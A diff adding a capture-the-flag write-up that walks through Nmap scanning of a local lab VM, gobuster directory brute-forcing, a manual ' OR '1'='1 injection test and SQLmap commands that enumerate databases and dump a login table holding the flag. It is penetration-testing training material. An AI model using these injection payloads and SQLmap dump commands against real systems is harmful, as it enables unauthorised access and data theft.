@@ -1,0 +1,81 @@
+Summary:
+  The challenge involved network reconnaissance, web directory enumeration, and SQL injection through a hidden login portal. 
+  Using a combination of tools, including Nmap, DirBuster, Burp Suite, and SQLmap, the target database was fully compromised, and the flag was extracted. 
+  The overall process required careful iteration and troubleshooting across multiple phases, particularly during directory discovery and SQLmap configuration.
+tools:
+  burpsuite, nmap, sqlmap, gobuster, dirbuster
+
+
+Reconnaissance:
+  The attacker machine was confirmed to be on the NAT Network by running "ip a", which revealed the Kali IP address of `10.0.2.5/24` on the "eth0" interface. 
+  An initial broad Nmap scan was performed across the subnet to identify all active hosts and their MAC addresses "nmap -Pn 10.0.2.0/24"
+  This identified three hosts: the attacker machine at `10.0.2.5`, the VirtualBox gateway at `10.0.2.3`, and the target at `10.0.2.15`. 
+  another scan was then run "nmap -sV -sC -oN scan.txt 10.0.2.15"
+  It confirmed that port `80/tcp` (HTTP) was open on the target, making it a web-based challenge. 
+  The target was accessed in the browser at `http://10.0.2.15/` however manual inspection of the page source and elements revealed no immediately useful information.
+
+Code Analysis / Directory Enumeration
+  With no visible attack surface on the root page, OWASP DirBuster was used to brute force hidden directories and files. An initial run with 
+  `directory-list-2.3-medium.txt` returned no useful results. A second attempt using the lowercase variant was performed
+  "gobuster dir -u http://10.0.2.15 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
+  This enumeration effort revealed the following directory structure:
+    /
+      index.html
+      /icons/
+        profile.php
+      /javascript/
+        exploit.html
+  A critical lesson learned during this phase was the importance of including file extensions in the scan. 
+  The initial two hours of scanning without specifying extensions such as `.html`, `.php`, `.txt`, and `.bak` yielded nothing. 
+  Once extensions were included, `exploit.html` was discovered within 20 minutes. The file was accessed at 
+  `http://10.0.2.15/exploit.html` and presented a file submission and query submission interface. 
+  However, submitting anything produced a broken link pointing to `profile.php` using a localhost address. 
+  Reformatting the link to use the target IP instead led to `http://10.0.2.15/profile.php`, which revealed a login portal.
+
+Injection and Privilege Escalation:
+  Upon reaching the login portal, basic SQL injection strings were manually tested to confirm potential vulnerability, including the classic " OR '1'='1 "
+  To automate and deepen this testing, Burp Suite was configured as a proxy to intercept HTTP traffic. The browser was pointed to the Burp listener at 
+  host ip=127.0.0.1 and port 8080 and the login form was submitted with test credentials to capture the raw HTTP request. The intercepted packet revealed the 
+  POST parameters as `user` and `pass`, along with session cookies for `role` and `user` that were base64 encoded.
+
+  The captured request data was used to construct the following SQLmap command:
+
+sqlmap -u "http://10.0.2.15/enter_network/" \
+  --data="user=pass+&pass=asdf&sub=SEND" \
+  --cookie="role=MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%253D; \
+  user=JGFyZ29uMmkkdj0xOSRtPTY1NTM2LHQ9NCxwPTEkUTBKcGN6aFZka3BTYWxsUFFXRnZSUSRHeTEwMTRva2UzU0ZTL0Rja1prd1VNL3JTNkhkSjF6YTgzcUFIT3NWMS93" \
+  -p user,pass --level 3 --risk 3 --batch --threads 10 --dbs
+
+  After approximately 30 minutes SQLmap successfully identified the injection point and enumerated four databases: 
+  `information_schema`, `Machine`, `mysql`, and `performance_schema`. The `Machine` database was identified as the 
+  custom CTF database. Tables were then enumerated:
+  
+sqlmap -u "http://10.0.2.15/enter_network/" \
+  --data="user=pass+&pass=asdf&sub=SEND" \
+  --cookie="..." \
+  --batch -D Machine --tables
+
+  This revealed a `login` table, which was then dumped:
+
+sqlmap -u "http://10.0.2.15/enter_network/" \
+  --data="user=pass+&pass=asdf&sub=SEND" \
+  --cookie="..." \
+  --batch -D Machine -T login --dump
+
+Flag Capture:
+  Dumping the `login` table returned the following result:  
+  Database: Machine
+  Table: login
+  [1 entry]
+  +--------+-----------------+---------------+
+  | role   | password        | username      |
+  +--------+-----------------+---------------+
+  | admin  | FLAG{N7:KSA_01} | administrator |
+  +--------+-----------------+---------------+
+
+Key Takeaways:
+  Always include file extensions in directory brute forcing.** Running DirBuster or Gobuster without specifying extensions like `-x php,html,txt,bak` can result in hours of wasted scanning. 
+  Parameter names matter in SQLmap.** Using incorrect parameter names with the `-p` flag causes SQLmap to fail silently. Always verify the exact POST parameter names from the intercepted request before running SQLmap.
+  Burp Suite exports XML, not raw HTTP.** When saving a request from Burp Suite using "Save item", it exports an XML file that SQLmap cannot read. The correct approach is to either copy the raw request manually from the Proxy tab or use the `--data` and `--cookie` flags in SQLmap directly.
+  Session cookies are critical for SQLmap accuracy.** Including the session cookies captured from Burp Suite significantly improved SQLmap's ability to interact with the target correctly and identify the injection point. Without them earlier attempts failed entirely.
+  Custom databases are always the target.** When SQLmap enumerates multiple databases, system databases like `information_schema`, `mysql`, and `performance_schema` can be ignored. The custom named database, in this case `Machine`, will always contain the CTF relevant data.
